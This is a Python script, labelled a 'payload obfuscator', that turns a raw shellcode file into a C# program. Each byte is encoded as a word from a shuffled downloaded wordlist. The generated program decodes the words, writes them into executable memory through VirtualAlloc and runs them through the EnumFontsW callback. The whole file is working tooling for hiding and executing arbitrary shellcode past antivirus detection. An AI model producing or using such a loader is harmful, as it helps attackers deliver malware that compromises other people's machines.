#!/usr/bin/env python3

import sys
import requests
import random
import json


def main(input_file):
    # headers
    csharp_headers = '''using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
    '''


    # Creation du dictionnaire de correspondance
    word_site = "https://www.mit.edu/~ecprice/wordlist.10000"
    response = requests.get(word_site)
    words = response.content.splitlines()
    words = [word.decode('utf-8') for word in words]
    random.shuffle(words)
    hex_values = [f'0x{i:02x}' for i in range(256)]
    word_dict = dict(zip(hex_values, words[:256]))
    dict_items = [f'{{ "{hex_val}", {word}}}' for word, hex_val in word_dict.items()]
    csharp_dict = "var wordDict = new Dictionary<string, byte>\n{\n    " + ",\n    ".join(dict_items) + "\n};"

    # Encodage du payload
    encoded_string = "string data = \""
    with open(input_file, 'rb') as f_in:
        byte = f_in.read(1)
        while byte:
            hex_value = f"0x{byte.hex()}"
            if hex_value in word_dict:
                encoded_string += word_dict[hex_value] + ' '
            byte = f_in.read(1)
    encoded_string = encoded_string.rstrip() + "\";"


    # Affichage de la fonction de decodage
    csharp_decoding_function = """
    static byte[] DecodeWordsToBytes(string data, Dictionary<string, byte> wordDict){
        var words = data.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
        var byteList = new List<byte>();
        foreach (var word in words){
            if (wordDict.ContainsKey(word)){
                byteList.Add(wordDict[word]);
            }else{
                Console.WriteLine("[!] Error while decoding");
            }
        }
        return byteList.ToArray();
    }"""

    # Affichage de la fonction d'exécution
    csharp_executing_function = '''
    private static void ExecuteShellcode(byte[] shellcode)
    {
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, p, shellcode.Length);
        IntPtr dc = GetDCEx(IntPtr.Zero, IntPtr.Zero, 0);
        EnumFontsW(dc, null, p, IntPtr.Zero);
        ReleaseDC(IntPtr.Zero, dc);

        return;
    }
    '''



    csharp_class_1 = '''
public class Program
{
    const uint MEM_COMMIT = 0x00001000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    [DllImport("kernelbase.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("gdi32.dll")]
    static extern int EnumFontsW(IntPtr hdc, [MarshalAs(UnmanagedType.LPWStr)] string lpLogfont, IntPtr lpProc, IntPtr lParam);
    [DllImport("user32.dll")]
    static extern IntPtr GetDCEx(IntPtr hWnd, IntPtr hRgnClip, uint flags);
    [DllImport("user32.dll")]
    static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    public static void Main()
    {
        Run();
    }

    public static void Run()
    {
    '''

    csharp_class_2 = '''
        byte[] decodedBytes = DecodeWordsToBytes(data, wordDict);
        ExecuteShellcode(decodedBytes);
    }
    '''

    csharp_class_3 = '''
}
    '''

    # Combiner toutes les parties dans un fichier C# généré
    cs_code = f"{csharp_headers}\n\n\n{csharp_class_1}\n\n\n{csharp_dict}\n\n\n{encoded_string}\n\n\n{csharp_class_2}\n\n\n{csharp_decoding_function}\n\n\n{csharp_executing_function}\n\n\n{csharp_class_3}"

    # Sauvegarder le code généré dans un fichier
    with open('generated_code.cs', 'w') as f:
        f.write(cs_code)
    print("Code C# généré avec succès dans 'generated_code.cs'")

    


if __name__ == "__main__":
    print("##########################################")
    print("########### PAYLOAD OBFUSCATOR ###########")
    print("##########################################\n")
    if len(sys.argv) != 2:
        print("Usage: python encode_cs.py <path_to_raw_payload_file>\n")
        sys.exit(1)
    
    file_path = sys.argv[1]
    main(file_path)